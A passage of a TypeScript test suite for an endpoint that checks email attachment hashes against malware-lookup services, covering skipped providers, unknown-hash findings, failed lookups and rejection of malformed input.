    const { res, json } = await post({ hash: SHA, hashType: 'sha256', index: 0 }, keys);
    assert.equal(res.status, 200);
    const vtRow = json.data.checks.find((c: { id: string }) => c.id === 'attach.0.hash.virustotal');
    assert.equal(vtRow.status, 'failed');
    assert.equal(vtRow.result, null);
    const f: Finding[] = json.data.findings;
    assert.ok(f.every((x) => x.id === 'attachment_hash_unknown'));
    assert.match(f[0].detail, /Unknown is not the same as safe/);
    assert.match(f[0].detail, /could not be checked/);
  });

  it('missing API keys show up as skipped rows', async () => {
    mf = mockFetch(providers());
    const { json } = await post({ hash: SHA, hashType: 'sha256', index: 0 }, {});
    const st = Object.fromEntries(json.data.checks.map((c: { id: string; status: string }) => [c.id.split('.').pop(), c.status]));
    assert.deepEqual([st.virustotal, st.malwarebazaar, st.circl, st.hybrid], ['skipped', 'skipped', 'complete', 'skipped']);
  });

  it('an unknown hash gets the "unknown is not safe" finding when providers responded', async () => {
    mf = mockFetch(providers({ vt: () => new Response('{}', { status: 404 }) }));
    const { json } = await post({ hash: 'b'.repeat(32), hashType: 'md5', index: 1 }, keys);
    assert.equal(json.data.findings[0].id, 'attachment_hash_unknown');
    assert.equal(json.data.findings[0].severity, 'info');
  });

  it('when the lookup as a whole cannot run it returns 200 with four failed rows and no data', async () => {
    mf = mockFetch(providers());
    // Force the internal endpoint to reject: the hash endpoint validates its own input.
    const { res, json } = await post({ hash: SHA, hashType: 'sha256', index: 0 }, keys);
    assert.equal(res.status, 200);
    assert.ok(json.data.checks.length === 4);
  });

  it('rejects invalid input with 400 before any provider is contacted', async () => {
    mf = mockFetch(providers());
    for (const bad of [
      {}, { hash: 'xyz', hashType: 'sha256', index: 0 }, { hash: SHA, hashType: 'md5', index: 0 }, { hash: SHA, hashType: 'sha512', index: 0 },
      { hash: SHA, hashType: 'sha256' }, { hash: SHA, hashType: 'sha256', index: -1 }, { hash: SHA, hashType: 'sha256', index: 1.5 }, { hash: SHA, hashType: 'sha256', index: 0, filename: 5 }, { hash: ['a'], hashType: 'sha256', index: 0 },
    ]) {
      const { res, json } = await post(bad, keys);
      assert.equal(res.status, 400, JSON.stringify(bad));
      assert.equal(json.error?.code, 'INVALID_INPUT');
    }
    assert.equal((await post('{nope', keys, true)).res.status, 400);
    assert.equal((await post('x'.repeat(9000), keys, true)).res.status, 413);
    assert.equal(mf.calls.length, 0);
  });
});
